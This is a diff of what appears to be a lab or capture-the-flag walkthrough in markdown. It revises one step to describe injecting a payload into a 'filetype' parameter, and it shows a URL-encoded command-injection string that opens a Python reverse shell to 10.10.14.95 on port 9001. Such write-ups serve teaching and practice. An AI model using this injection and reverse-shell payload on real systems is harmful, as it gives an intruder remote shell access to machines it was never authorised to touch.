@@ -59,7 +59,7 @@ Start netcat
 
 ![Ping](images/img(12).png?raw=true "Ping")
 
-Prepare a python reverse shell and url encode it
+Prepare a python reverse shell, url encode it, insert into filetype parameter and make request to netcat. 
 
 ```
 %3bexport+RHOST%3d"10.10.14.95"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
